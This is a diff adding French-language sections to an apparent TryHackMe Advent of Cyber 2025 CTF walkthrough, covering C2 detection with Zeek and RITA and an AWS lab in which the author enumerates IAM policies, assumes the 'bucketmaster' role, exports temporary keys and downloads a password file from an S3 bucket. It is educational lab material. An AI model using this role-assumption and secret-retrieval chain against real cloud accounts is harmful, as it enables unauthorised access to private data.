@@ -34,6 +34,7 @@ Lien vers l'épreuve : <https://tryhackme.com/room/adventofcyber2025>
 * [Jour 20 : Race Conditions - Toy to The World](#jour-20--race-conditions---toy-to-the-world)
 * [Jour 21 : Malware Analysis - Malhare.exe](#jour-21--malware-analysis---malhareexe)
 * [Jour 22 : C2 Detection - Command \& Carol](#jour-22--c2-detection---command--carol)
+* [Jour 23 : AWS Security - S3cret Santa](#jour-23--aws-security---s3cret-santa)
 
 ## Jour 1 : [Linux CLI - *Shells Bells*](https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti)
 
@@ -3144,3 +3145,429 @@ Write-Output $deco
 ## Jour 22 : [C2 Detection - Command & Carol](https://tryhackme.com/room/detecting-c2-with-rita-aoc2025-m9n2b5v8c1)
 
 ![AoC 2025 jour 22](https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1761803168624.svg)
+
+Commençons par convertir le fichier PCAP (*Packet Capture*) dans un format [Zeek](https://github.com/zeek/zeek) compréhensible par l'outil [Rita](https://github.com/activecm/rita).
+
+```bash
+zeek readpcap pcaps/rita_challenge.pcap zeek_logs/rita_challenge/
+```
+
+```txt
+Starting the Zeek docker container
+Zeek logs will be saved to /home/ubuntu/zeek_logs/rita_challenge
+```
+
+Ce qui nous permet d'avoir une collection de fichiers logs.
+
+```bash
+ls -lh zeek_logs/rita_challenge/
+```
+
+{% capture spoil %}
+
+```txt
+total 172K
+-rw-r--r-- 1 root root  488 Dec 24 10:30 analyzer.log
+-rw-r--r-- 1 root root  542 Dec 24 10:30 capture_loss.log
+-rw-r--r-- 1 root root  47K Dec 24 10:30 conn.log
+-rw-r--r-- 1 root root 3.6K Dec 24 10:30 dns.log
+-rw-r--r-- 1 root root 4.4K Dec 24 10:30 files.log
+-rw-r--r-- 1 root root  35K Dec 24 10:30 http.log
+-rw-r--r-- 1 root root  317 Dec 24 10:30 known_hosts.log
+-rw-r--r-- 1 root root  527 Dec 24 10:30 known_services.log
+-rw-r--r-- 1 root root  35K Dec 24 10:30 loaded_scripts.log
+-rw-r--r-- 1 root root 1.6K Dec 24 10:30 notice.log
+-rw-r--r-- 1 root root  278 Dec 24 10:30 packet_filter.log
+-rw-r--r-- 1 root root  379 Dec 24 10:30 reporter.log
+-rw-r--r-- 1 root root 1000 Dec 24 10:30 software.log
+-rw-r--r-- 1 root root 2.1K Dec 24 10:30 stats.log
+-rw-r--r-- 1 root root 2.9K Dec 24 10:30 weird.log
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Importons ensuite les logs générés dans l'outil Rita
+
+```bash
+rita import --logs ~/zeek_logs/rita_challenge/ --database rita_challenge
+```
+
+{% capture spoil %}
+
+```txt
+[...expurgé pour brièveté...]
+[-] Parsing:  /tmp/zeek_logs/conn.log
+[-] Parsing:  /tmp/zeek_logs/http.log
+[-] Parsing:  /tmp/zeek_logs/dns.log
+[...expurgé pour brièveté...]
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Nous pouvons à présent lancer l'outil Rita pour démarrer notre analyse.
+
+```bash
+rita view rita_challenge
+```
+
+L'outil permet de mettre en avant des connexions vers l'URL rabbithole[.]malhare[.]net, ainsi qu'un nombre plus important de connexion depuis l'adresse IP 10[.]0[.]0[.]15.
+
+{% include elements/figure_spoil.html image="images/THM/AoC2025/20251222_Malhare.png" caption="Nombre de connexions le plus important et informations Threat Modifiers" %}
+
+En suivant l'aide de l'outil de recherche, nous pouvons trouver les cas préoccupants de connexions vers un serveur C2 (*Command & Control*) notamment ceux avec un *beacon* élevé (indicateur permettant d'indiquer les connexions périodiques, indicateur intéressant pour la détection de C2).
+
+{% include elements/figure_spoil.html image="images/THM/AoC2025/20251222_Search.png" caption="Recherche des machines les plus impactées" %}
+
+## Jour 23 : [AWS Security - S3cret Santa](https://tryhackme.com/room/cloudenum-aoc2025-y4u7i0o3p6)
+
+![AoC 2025 jour 23](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1764055517343.png)
+
+Commençons par récupérer les informations sur le compte utilisé pour AWS.
+
+```bash
+aws sts get-caller-identity
+```
+
+{% capture spoil %}
+
+```json
+{
+    "UserId": "vgd7e0pham1e5llwcvt5",
+    "Account": "...expurgé...",
+    "Arn": "arn:aws:iam::...expurgé...:user/sir.carrotbane"
+}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+L'utilisateur `sir.carrotbane` peut bénéficier de droits particulier, pour le vérifier, nous pouvons utiliser trois commandes pour:
+
+```bash
+aws iam list-user-policies --user-name sir.carrotbane
+
+aws iam list-attached-user-policies --user-name sir.carrotbane
+
+aws iam list-groups-for-user --user-name sir.carrotbane
+```
+
+Seule la première requête retourne une réponse non vide.
+
+{% capture spoil %}
+
+```json
+{
+    "PolicyNames": [
+        "[...expurgé...]"
+    ]
+}
+
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Nous pouvons utiliser la commande suivante pour détailler les droits de l'utilisateur `sir.carrotbane` :
+
+```bash
+aws iam get-user-policy --policy-name [...expurgé...] --user-name sir.carrotbane
+```
+
+{% capture spoil %}
+
+```json
+{
+    "UserName": "sir.carrotbane",
+    "PolicyName": "[...expurgé...]",
+    "PolicyDocument": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Action": [
+                    "iam:ListUsers",
+                    "iam:ListGroups",
+                    "iam:ListRoles",
+                    "iam:ListAttachedUserPolicies",
+                    "iam:ListAttachedGroupPolicies",
+                    "iam:ListAttachedRolePolicies",
+                    "iam:GetUserPolicy",
+                    "iam:GetGroupPolicy",
+                    "iam:GetRolePolicy",
+                    "iam:GetUser",
+                    "iam:GetGroup",
+                    "iam:GetRole",
+                    "iam:ListGroupsForUser",
+                    "iam:ListUserPolicies",
+                    "iam:ListGroupPolicies",
+                    "iam:ListRolePolicies",
+                    "sts:AssumeRole"
+                ],
+                "Effect": "Allow",
+                "Resource": "*",
+                "Sid": "ListIAMEntities"
+            }
+        ]
+    }
+}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+L'utilisateur dispose de l'action `sts:AssumeRole` qui lui permet de s'approprier un rôle qui ne lui est pas déjà attribué.
+
+Pour vérifier les rôles existants, nous pouvons utiliser la commande :
+
+```bash
+aws iam list-roles
+```
+
+{% capture spoil %}
+
+```json
+{
+    "Roles": [
+        {
+            "Path": "/",
+            "RoleName": "bucketmaster",
+            "RoleId": "AROARZPUZDIKNBJWUJGIE",
+            "Arn": "arn:aws:iam::[...expurgé...]:role/bucketmaster",
+            "CreateDate": "2025-12-24T14:42:44.687073+00:00",
+            "AssumeRolePolicyDocument": {
+                "Statement": [
+                    {
+                        "Action": "sts:AssumeRole",
+                        "Effect": "Allow",
+                        "Principal": {
+                            "AWS": "arn:aws:iam::[...expurgé...]:user/sir.carrotbane"
+                        }
+                    }
+                ],
+                "Version": "2012-10-17"
+            },
+            "MaxSessionDuration": 3600
+        }
+    ]
+}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+L'utilisateur `sir.carrotbane` peut donc utiliser le rôle `bucketmaster`. Ce qui implique qu'il peut prétendre utiliser la policy `BucketMasterPolicy` permettant de lister les Buckets, et récupérer des objets.
+
+```bash
+aws iam list-role-policies --role-name bucketmaster
+```
+
+{% capture spoil %}
+
+```json
+{
+    "PolicyNames": [
+        "BucketMasterPolicy"
+    ]
+}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+```bash
+aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
+```
+
+{% capture spoil %}
+
+```json
+{
+    "RoleName": "bucketmaster",
+    "PolicyName": "BucketMasterPolicy",
+    "PolicyDocument": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Action": [
+                    "s3:ListAllMyBuckets"
+                ],
+                "Effect": "Allow",
+                "Resource": "*",
+                "Sid": "ListAllBuckets"
+            },
+            {
+                "Action": [
+                    "s3:ListBucket"
+                ],
+                "Effect": "Allow",
+                "Resource": [
+                    "arn:aws:s3:::easter-secrets-123145",
+                    "arn:aws:s3:::bunny-website-645341"
+                ],
+                "Sid": "ListBuckets"
+            },
+            {
+                "Action": [
+                    "s3:GetObject"
+                ],
+                "Effect": "Allow",
+                "Resource": "arn:aws:s3:::easter-secrets-123145/*",
+                "Sid": "GetObjectsFromEasterSecrets"
+            }
+        ]
+    }
+}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Pour pouvoir s'approprier le rôle, nous devons créer une session temporaire qui nous fournira des identifiants valides pendant une heure.
+
+```bash
+aws sts assume-role --role-arn arn:aws:iam::[...expurgé...]:role/bucketmaster --role-session-name AoC2025
+```
+
+{% capture spoil %}
+
+```json
+{
+    "Credentials": {
+        "AccessKeyId": "ASIARZ...",
+        "SecretAccessKey": "WFa6or...",
+        "SessionToken": "FQoGZXIvY...",
+        "Expiration": "2025-12-24T16:10:09.996661+00:00"
+    },
+    "AssumedRoleUser": {
+        "AssumedRoleId": "AROARZPUZDIKNBJWUJGIE:AoC2025",
+        "Arn": "arn:aws:sts::[...expurgé...]:assumed-role/bucketmaster/AoC2025"
+    },
+    "PackedPolicySize": 6
+}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Puis nous ajoutons les valeurs `AccessKeyId`, `SecretAccessKey`, et `SessionToken` aux variables d'environnement.
+
+```bash
+export AWS_ACCESS_KEY_ID="ASIARZ..."
+export AWS_SECRET_ACCESS_KEY="WFa6or..."
+export AWS_SESSION_TOKEN="FQoGZXIvY..."
+```
+
+Pour vérifier que l'opération a fonctionné, on peut reprendre la toute première commande vue aujourd'hui.
+
+```bash
+aws sts get-caller-identity
+```
+
+{% capture spoil %}
+
+```json
+{
+    "UserId": "AROARZPUZDIKNBJWUJGIE:AoC2025",
+    "Account": "[...expurgé...]",
+    "Arn": "arn:aws:sts::[...expurgé...]:assumed-role/bucketmaster/AoC2025"
+}
+
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Il ne reste qu'à profiter des nouveaux privilèges pour récupérer le flag final.
+
+```bash
+aws s3api list-buckets
+```
+
+{% capture spoil %}
+
+```json
+{
+    "Buckets": [
+        {
+            "Name": "bunny-website-645341",
+            "CreationDate": "2025-12-24T14:42:44+00:00"
+        },
+        {
+            "Name": "easter-secrets-123145",
+            "CreationDate": "2025-12-24T14:42:44+00:00"
+        }
+    ],
+    "Owner": {
+        "DisplayName": "webfile",
+        "ID": "bcaf1ffd86f41161ca5fb16fd081034f"
+    },
+    "Prefix": null
+}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+L'analyse du premier bucket ne semble pas pertinente, seul un fichier HTML y est stocké. En revanche, le bucket `easter-secrets-123145` cache un fichier de mot de passe.
+
+```bash
+aws s3api list-objects --bucket easter-secrets-123145
+```
+
+{% capture spoil %}
+
+```json
+{
+    "Contents": [
+        {
+            "Key": "cloud_password.txt",
+            "LastModified": "2025-12-24T14:42:45+00:00",
+            "ETag": "\"c63e1474bf79a91ef95a1e6c8305a304\"",
+            "Size": 29,
+            "StorageClass": "STANDARD",
+            "Owner": {
+                "DisplayName": "webfile",
+                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
+            }
+        },
+        {
+            "Key": "groceries.txt",
+            "LastModified": "2025-12-24T14:42:45+00:00",
+            "ETag": "\"44a93e970be00ed62b8742f42c8600d8\"",
+            "Size": 28,
+            "StorageClass": "STANDARD",
+            "Owner": {
+                "DisplayName": "webfile",
+                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
+            }
+        }
+    ],
+    "RequestCharged": null,
+    "Prefix": null
+}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Pour le récupérer, nous utilisons la commande :
+
+```bash
+aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
+```
+
+Ne reste plus qu'à lire le contenu du document.
+
+```bash
+cat cloud_password.txt
+```
+
+{% capture spoil %}
+
+```txt
+THM{[...expurgé...]}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
